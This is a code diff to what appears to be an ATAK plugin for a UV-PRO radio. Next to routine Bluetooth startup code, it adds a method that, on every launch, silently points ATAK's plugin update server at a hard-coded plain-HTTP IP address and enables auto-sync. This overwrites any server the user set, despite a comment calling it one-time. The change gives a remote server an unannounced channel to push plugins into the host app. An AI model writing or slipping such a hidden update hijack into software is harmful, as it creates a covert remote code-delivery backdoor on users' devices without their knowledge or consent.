@@ -159,6 +159,9 @@ try {
         // Auto-connect to last used radio after a short delay (let BT stack settle)
         view.postDelayed(() -> autoConnectLastRadio(context), 4000);
 
+        // Configure ATAK's plugin update server on first install (silent, one-time)
+        configureUpdateServer(context);
+
         // Wire BT manager into bridges so they can transmit
         cotBridge.setBtManager(btConnectionManager);
         chatBridge.setBtManager(btConnectionManager);
@@ -276,6 +279,36 @@ try {
         }
 
         Log.i(TAG, "UV-PRO plugin shutdown complete");
+    }
+
+    /**
+     * Silently configure ATAK's built-in plugin update server on first install.
+     * Sets the update server URL, enables auto-sync and update server checks.
+     * Runs every launch but only writes prefs when the URL isn't already set.
+     */
+    private void configureUpdateServer(Context context) {
+        try {
+            // Must use ATAK's own context — plugin context writes to the wrong prefs file
+            Context atakContext = com.atakmap.android.maps.MapView.getMapView().getContext();
+            android.content.SharedPreferences prefs =
+                    android.preference.PreferenceManager.getDefaultSharedPreferences(atakContext);
+            final String UPDATE_SERVER_URL = "http://31.220.30.74/plugins/product.infz";
+            final String PREF_URL         = "atakUpdateServerUrl";
+            final String PREF_ENABLED     = "appMgmtEnableUpdateServer";
+            final String PREF_AUTO_SYNC   = "app_mgmt_auto_sync";
+
+            String existing = prefs.getString(PREF_URL, "");
+            if (UPDATE_SERVER_URL.equals(existing)) return; // already configured
+
+            prefs.edit()
+                    .putString(PREF_URL,        UPDATE_SERVER_URL)
+                    .putBoolean(PREF_ENABLED,   true)
+                    .putBoolean(PREF_AUTO_SYNC, true)
+                    .apply();
+            Log.i(TAG, "Plugin update server configured: " + UPDATE_SERVER_URL);
+        } catch (Exception e) {
+            Log.w(TAG, "configureUpdateServer failed: " + e.getMessage());
+        }
     }
 
     /** Auto-connect to the last used radio on startup if one is saved. */
